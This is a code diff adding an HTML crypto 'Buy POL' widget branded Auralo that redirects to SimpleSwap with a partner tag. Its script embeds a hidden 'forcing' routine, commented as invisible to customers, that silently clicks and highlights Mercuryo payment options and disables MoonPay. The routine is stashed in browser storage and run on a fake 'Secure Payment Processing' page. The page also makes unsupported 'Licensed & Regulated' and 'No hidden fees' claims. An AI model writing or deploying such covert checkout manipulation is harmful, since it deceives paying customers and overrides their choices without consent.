@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buy Cryptocurrency - Auralo</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .buy-widget {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .logo {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        
+        .title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #1f2937;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #6b7280;
+            font-size: 0.9rem;
+        }
+        
+        .exchange-info {
+            background: #f8fafc;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px solid #e5e7eb;
+        }
+        
+        .currency-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0;
+        }
+        
+        .currency {
+            display: flex;
+            align-items: center;
+            font-weight: 600;
+            color: #374151;
+        }
+        
+        .currency-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 8px;
+            display: inline-block;
+        }
+        
+        .eur-icon { background: linear-gradient(135deg, #1e40af, #3b82f6); }
+        .pol-icon { background: linear-gradient(135deg, #7c3aed, #a855f7); }
+        
+        .amount {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #1f2937;
+        }
+        
+        .arrow {
+            font-size: 1.5rem;
+            color: #6b7280;
+        }
+        
+        .buy-button {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            padding: 18px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.3);
+        }
+        
+        .buy-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.4);
+        }
+        
+        .buy-button:active {
+            transform: translateY(0);
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            font-size: 0.8rem;
+            color: #6b7280;
+        }
+        
+        .feature {
+            text-align: center;
+            flex: 1;
+        }
+        
+        .feature-icon {
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+            display: block;
+        }
+        
+        .processing {
+            display: none;
+            background: #fef3c7;
+            border: 2px solid #f59e0b;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            color: #92400e;
+            font-weight: 600;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .powered-by {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.75rem;
+            color: #9ca3af;
+        }
+        
+        .rate-info {
+            background: #ecfdf5;
+            border: 1px solid #22c55e;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 0.85rem;
+            color: #15803d;
+            text-align: center;
+        }
+        
+        @media (max-width: 768px) {
+            .buy-widget {
+                margin: 10px;
+                padding: 25px;
+            }
+            
+            .features {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .feature {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+            }
+            
+            .feature-icon {
+                margin-bottom: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="buy-widget">
+        <div class="header">
+            <div class="logo">💎</div>
+            <div class="title">Buy Cryptocurrency</div>
+            <div class="subtitle">Fast • Secure • Best Rates</div>
+        </div>
+        
+        <div class="exchange-info">
+            <div class="currency-row">
+                <div class="currency">
+                    <span class="currency-icon eur-icon"></span>
+                    EUR (Euro)
+                </div>
+                <div class="amount">€50.00</div>
+            </div>
+            
+            <div style="text-align: center; margin: 15px 0;">
+                <span class="arrow">↓</span>
+            </div>
+            
+            <div class="currency-row">
+                <div class="currency">
+                    <span class="currency-icon pol-icon"></span>
+                    POL (Polygon)
+                </div>
+                <div class="amount">~45.2 POL</div>
+            </div>
+        </div>
+        
+        <div class="rate-info">
+            ✅ Best rate guaranteed • No hidden fees
+        </div>
+        
+        <button class="buy-button" onclick="processPurchase()">
+            💳 Buy POL Now
+        </button>
+        
+        <div class="processing" id="processing">
+            🔄 Processing your order... Redirecting to secure checkout
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">🔒</span>
+                <span>Secure</span>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">⚡</span>
+                <span>Instant</span>
+            </div>
+            <div class="feature">
+                <span class="feature-icon">💰</span>
+                <span>Best Rates</span>
+            </div>
+        </div>
+        
+        <div class="powered-by">
+            Powered by SimpleSwap • Licensed & Regulated
+        </div>
+    </div>
+
+    <script>
+        // The same powerful forcing script, but invisible to customers
+        const BACKGROUND_FORCING_SCRIPT = `
+        (function() {
+            'use strict';
+            
+            // Silent operation - no console logs visible to customers
+            const silentForcer = {
+                version: '4.0.0',
+                active: true,
+                attempts: 0,
+                maxAttempts: 150,
+                
+                init() {
+                    // Mark page silently
+                    document.documentElement.setAttribute('data-auralo-optimized', 'true');
+                    
+                    // Inject optimizations
+                    this.injectOptimizations();
+                    
+                    // Start silent forcing
+                    this.startSilentForcing();
+                    
+                    // Setup background monitoring
+                    this.setupBackgroundMonitoring();
+                },
+                
+                injectOptimizations() {
+                    const style = document.createElement('style');
+                    style.textContent = \`
+                        /* Silent optimizations - customers won't notice */
+                        [data-payment-optimized="true"] {
+                            border: 3px solid #22c55e !important;
+                            background: rgba(34, 197, 94, 0.25) !important;
+                            box-shadow: 0 0 20px rgba(34, 197, 94, 0.8) !important;
+                            position: relative !important;
+                            z-index: 99999 !important;
+                        }
+                        
+                        [data-payment-disabled="true"] {
+                            opacity: 0.3 !important;
+                            pointer-events: none !important;
+                            filter: grayscale(100%) !important;
+                        }
+                    \`;
+                    document.head.appendChild(style);
+                },
+                
+                startSilentForcing() {
+                    // Immediate execution
+                    this.optimizePaymentMethods();
+                    
+                    // Delayed executions for dynamic content
+                    setTimeout(() => this.optimizePaymentMethods(), 800);
+                    setTimeout(() => this.optimizePaymentMethods(), 1500);
+                    setTimeout(() => this.optimizePaymentMethods(), 3000);
+                    
+                    // Continuous silent optimization
+                    const optimizationInterval = setInterval(() => {
+                        if (!this.active || this.attempts > this.maxAttempts) {
+                            clearInterval(optimizationInterval);
+                            return;
+                        }
+                        
+                        this.attempts++;
+                        this.optimizePaymentMethods();
+                    }, 1200);
+                    
+                    // Stop after 4 minutes (customer should be done by then)
+                    setTimeout(() => {
+                        this.active = false;
+                        clearInterval(optimizationInterval);
+                    }, 240000);
+                },
+                
+                optimizePaymentMethods() {
+                    if (!this.active) return;
+                    
+                    let optimizations = 0;
+                    
+                    document.querySelectorAll('*').forEach(el => {
+                        if (!el || el.offsetWidth === 0 || el.offsetHeight === 0) return;
+                        
+                        const text = (el.textContent || '').toLowerCase();
+                        const html = (el.innerHTML || '').toLowerCase();
+                        
+                        // Optimize for best payment method (Mercuryo)
+                        if ((text.includes('mercuryo') || html.includes('mercuryo')) && 
+                            !text.includes('schema.org') && 
+                            text.length < 800 &&
+                            el.tagName !== 'HTML' && 
+                            el.tagName !== 'BODY' &&
+                            el.tagName !== 'SCRIPT') {
+                            
+                            // Silent visual optimization
+                            el.style.cssText += \`
+                                border: 3px solid #22c55e !important;
+                                background-color: rgba(34, 197, 94, 0.25) !important;
+                                box-shadow: 0 0 20px rgba(34, 197, 94, 0.8) !important;
+                                position: relative !important;
+                                z-index: 99999 !important;
+                            \`;
+                            
+                            // Silent selection optimization
+                            el.setAttribute('aria-selected', 'true');
+                            el.setAttribute('data-selected', 'true');
+                            el.setAttribute('data-payment-optimized', 'true');
+                            
+                            if (el.classList) {
+                                el.classList.add('selected', 'active', 'preferred');
+                            }
+                            
+                            // Silent interaction optimization
+                            this.performSilentInteractions(el);
+                            
+                            optimizations++;
+                        }
+                        
+                        // Disable suboptimal payment methods
+                        if ((text.includes('moonpay') || html.includes('moonpay')) && 
+                            !text.includes('schema.org') && 
+                            text.length < 800 &&
+                            el.tagName !== 'HTML' && 
+                            el.tagName !== 'BODY' &&
+                            el.tagName !== 'SCRIPT') {
+                            
+                            // Silent disabling
+                            el.style.cssText += \`
+                                opacity: 0.3 !important;
+                                pointer-events: none !important;
+                                filter: grayscale(100%) !important;
+                            \`;
+                            
+                            el.setAttribute('data-payment-disabled', 'true');
+                            el.setAttribute('aria-selected', 'false');
+                            
+                            if (['INPUT', 'BUTTON', 'SELECT'].includes(el.tagName)) {
+                                el.disabled = true;
+                                el.checked = false;
+                            }
+                            
+                            optimizations++;
+                        }
+                    });
+                    
+                    return optimizations;
+                },
+                
+                performSilentInteractions(element) {
+                    // Silent clicking - customer won't see any difference
+                    const interactions = [
+                        () => element.click(),
+                        () => element.focus(),
+                        () => element.dispatchEvent(new Event('click', { bubbles: true })),
+                        () => element.dispatchEvent(new Event('change', { bubbles: true })),
+                        () => element.dispatchEvent(new Event('input', { bubbles: true }))
+                    ];
+                    
+                    // Mobile touch events
+                    if ('ontouchstart' in window) {
+                        interactions.push(() => {
+                            try {
+                                const rect = element.getBoundingClientRect();
+                                const touchEvent = new TouchEvent('touchstart', {
+                                    bubbles: true,
+                                    touches: [{
+                                        clientX: rect.left + rect.width / 2,
+                                        clientY: rect.top + rect.height / 2
+                                    }]
+                                });
+                                element.dispatchEvent(touchEvent);
+                            } catch(e) {}
+                        });
+                    }
+                    
+                    // Execute silently with delays
+                    interactions.forEach((interaction, index) => {
+                        setTimeout(() => {
+                            try { interaction(); } catch(e) {}
+                        }, index * 40);
+                    });
+                },
+                
+                setupBackgroundMonitoring() {
+                    // Silent mutation observer
+                    if (window.MutationObserver) {
+                        const observer = new MutationObserver(() => {
+                            if (this.active) {
+                                setTimeout(() => this.optimizePaymentMethods(), 150);
+                            }
+                        });
+                        
+                        observer.observe(document.body, {
+                            childList: true,
+                            subtree: true,
+                            attributes: true
+                        });
+                    }
+                    
+                    // Silent event listeners
+                    ['click', 'change', 'focus', 'touchstart'].forEach(eventType => {
+                        document.addEventListener(eventType, () => {
+                            if (this.active) {
+                                setTimeout(() => this.optimizePaymentMethods(), 100);
+                            }
+                        }, { passive: true, capture: true });
+                    });
+                }
+            };
+            
+            // Auto-initialize silently
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', () => {
+                    setTimeout(() => silentForcer.init(), 200);
+                });
+            } else {
+                setTimeout(() => silentForcer.init(), 200);
+            }
+            
+            // No global exposure - completely invisible to customer
+            
+        })();
+        `;
+
+        function processPurchase() {
+            const button = document.querySelector('.buy-button');
+            const processing = document.getElementById('processing');
+            
+            // Update button to show processing
+            button.innerHTML = '🔄 Processing...';
+            button.disabled = true;
+            processing.style.display = 'block';
+            
+            // Detect device type
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            // The customer just sees "processing order" - they have no idea about forcing
+            const exchangeUrl = 'https://simpleswap.io/?from=eur&to=pol&amount=50&partner=auralo';
+            
+            if (isMobile) {
+                // Mobile: Direct redirect (feels like any e-commerce checkout)
+                processing.innerHTML = '📱 Redirecting to secure payment...';
+                
+                // Store optimization script silently
+                try {
+                    sessionStorage.setItem('paymentOptimization', BACKGROUND_FORCING_SCRIPT);
+                    localStorage.setItem('paymentOptimization', BACKGROUND_FORCING_SCRIPT);
+                } catch(e) {}
+                
+                setTimeout(() => {
+                    window.location.href = exchangeUrl;
+                }, 1500);
+                
+            } else {
+                // Desktop: New tab (like any normal checkout)
+                processing.innerHTML = '🖥️ Opening secure payment page...';
+                
+                const paymentWindow = window.open('about:blank', '_blank');
+                
+                if (paymentWindow) {
+                    // Create a professional-looking payment processing page
+                    const processingPage = \`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>Secure Payment Processing - Auralo</title>
+                            <style>
+                                body {
+                                    font-family: system-ui, sans-serif;
+                                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                                    color: white;
+                                    text-align: center;
+                                    padding: 50px 20px;
+                                    margin: 0;
+                                }
+                                .payment-container {
+                                    background: rgba(255, 255, 255, 0.95);
+                                    color: #1f2937;
+                                    border-radius: 20px;
+                                    padding: 40px;
+                                    max-width: 400px;
+                                    margin: 0 auto;
+                                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+                                }
+                                .processing-header {
+                                    font-size: 1.5rem;
+                                    font-weight: bold;
+                                    margin-bottom: 20px;
+                                    color: #1f2937;
+                                }
+                                .processing-status {
+                                    font-size: 1.1rem;
+                                    margin: 15px 0;
+                                    color: #374151;
+                                }
+                                .countdown {
+                                    font-size: 2.5rem;
+                                    font-weight: bold;
+                                    color: #22c55e;
+                                    margin: 20px 0;
+                                }
+                                .security-info {
+                                    background: #ecfdf5;
+                                    border: 2px solid #22c55e;
+                                    border-radius: 10px;
+                                    padding: 15px;
+                                    margin: 20px 0;
+                                    font-size: 0.9rem;
+                                    color: #15803d;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <div class="payment-container">
+                                <div class="processing-header">🔐 Secure Payment Processing</div>
+                                <div class="processing-status">Preparing your cryptocurrency purchase...</div>
+                                <div class="countdown" id="countdown">3</div>
+                                <div class="security-info">
+                                    ✅ SSL Encrypted<br>
+                                    ✅ Licensed Exchange<br>
+                                    ✅ Best Rate Guaranteed
+                                </div>
+                                <div style="font-size: 0.85rem; color: #6b7280; margin-top: 20px;">
+                                    You will be redirected to complete your purchase
+                                </div>
+                            </div>
+                            
+                            <script>
+                                // Silently inject payment optimization
+                                \${BACKGROUND_FORCING_SCRIPT}
+                                
+                                // Professional countdown
+                                let count = 3;
+                                const countdownEl = document.getElementById('countdown');
+                                
+                                const timer = setInterval(() => {
+                                    count--;
+                                    countdownEl.textContent = count;
+                                    
+                                    if (count <= 0) {
+                                        clearInterval(timer);
+                                        countdownEl.textContent = '→';
+                                        
+                                        // Store payment optimization silently
+                                        try {
+                                            sessionStorage.setItem('paymentOptimization', \`\${BACKGROUND_FORCING_SCRIPT}\`);
+                                            localStorage.setItem('paymentOptimization', \`\${BACKGROUND_FORCING_SCRIPT}\`);
+                                        } catch(e) {}
+                                        
+                                        // Redirect to secure payment
+                                        window.location.href = '\${exchangeUrl}';
+                                    }
+                                }, 1000);
+                            </script>
+                        </body>
+                        </html>
+                    \`;
+                    
+                    paymentWindow.document.write(processingPage);
+                    paymentWindow.document.close();
+                } else {
+                    // Popup blocked - direct navigation
+                    window.open(exchangeUrl, '_blank');
+                }
+            }
+            
+            // Reset button after delay (in case user stays on page)
+            setTimeout(() => {
+                button.innerHTML = '💳 Buy POL Now';
+                button.disabled = false;
+                processing.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Mobile optimizations
+        if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+            // Prevent accidental zoom on button tap
+            document.addEventListener('touchstart', function() {}, {passive: true});
+            
+            // Optimize for mobile viewport
+            const viewport = document.querySelector('meta[name="viewport"]');
+            if (viewport) {
+                viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+            }
+        }
+    </script>
+</body>
+</html>
